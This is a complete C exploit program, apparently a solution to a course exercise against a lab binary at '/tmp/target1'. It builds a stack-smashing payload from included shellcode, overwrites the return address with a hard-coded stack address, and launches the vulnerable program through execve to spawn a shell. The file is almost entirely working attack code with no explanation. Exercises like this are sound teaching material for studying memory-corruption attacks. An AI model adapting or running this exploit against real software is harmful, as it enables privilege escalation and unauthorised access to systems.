#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char sploit[256 + 8 + 1];
  memset(sploit, 0xff, sizeof sploit);
  memcpy(sploit, shellcode, sizeof shellcode - 1);
  int *eip = (int *) (sploit + 260);
  *eip = 0xbffffc50;
  sploit[264] = '\0';

  args[0] = TARGET; args[1] = sploit; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
